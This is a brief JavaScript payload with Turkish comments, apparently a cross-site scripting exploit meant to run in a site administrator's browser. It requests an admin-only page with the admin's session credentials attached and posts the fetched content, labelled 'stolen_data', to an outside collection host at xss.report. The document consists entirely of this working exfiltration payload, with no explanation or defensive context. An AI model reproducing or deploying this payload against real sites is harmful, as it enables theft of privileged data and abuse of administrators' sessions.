// Admin'in tarayıcısında çalışacak script
fetch('https://target.com/admin/workflow', { // Admin'in erişebildiği sayfa
    method: 'GET',
    credentials: 'include' // Admin'in oturum çerezi (HttpOnly) otomatik olarak eklenecek
}).then(response => response.text()) // Yanıtı text olarak al
.then(data => {
    // Çektiğimiz veriyi kendi sunucumuza gönder
    fetch('https://xss.report/c/alesta', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ stolen_data: data })
    });
}).catch(err => console.log('Hata:', err));
